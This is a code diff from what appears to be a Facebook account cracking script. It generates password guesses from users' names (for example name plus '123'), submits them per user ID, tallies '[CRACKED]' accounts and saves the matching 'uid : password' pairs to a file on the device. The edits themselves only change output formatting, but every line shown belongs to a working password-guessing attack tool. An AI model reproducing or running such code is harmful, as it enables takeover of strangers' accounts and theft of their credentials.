@@ -155,12 +155,13 @@ def auto_pass(fileeee):
                     pwx.append(name1+' '+mid_name+' '+sur_name+'123')
             except:pass
             feel.submit(file_subb,uid,pwx)
+            print(cox)
 loop=0
 oks=[]
 cps=[]
 def file_subb(uid,pwx):
     global oks,loop,cps
-    sys.stdout.write(f"\r \033[1;35m \n[CHECKED]: 0{loop} \033[1;33m [CRACKED]: 0{str(len(oks))}");sys.stdout.flush()
+    sys.stdout.write(f"\r \033[1;35m [CHECKED]: 0{loop} \033[1;33m [CRACKED]: 0{str(len(oks))}");sys.stdout.flush()
     session=requests.Session()
     try:
         for ps in pwx:
@@ -211,7 +212,7 @@ def file_subb(uid,pwx):
                 oks.append(uid)
                 break
             elif "PLEASE, CONFIRM EMAIL: " in q:
-                print(f"\r\r\033[0;36m  [GOXDIES] {uid} : {ps}")
+                print(f"\r\r\033[0;36m  [GOXDIES] {uid} : {ps}\n")
                 open("/sdcard/GOXDIES.txt","a+").write(uid+" : "+ps+"\n")
                 oks.append(uid)
             elif "www.facebook.com" in q:
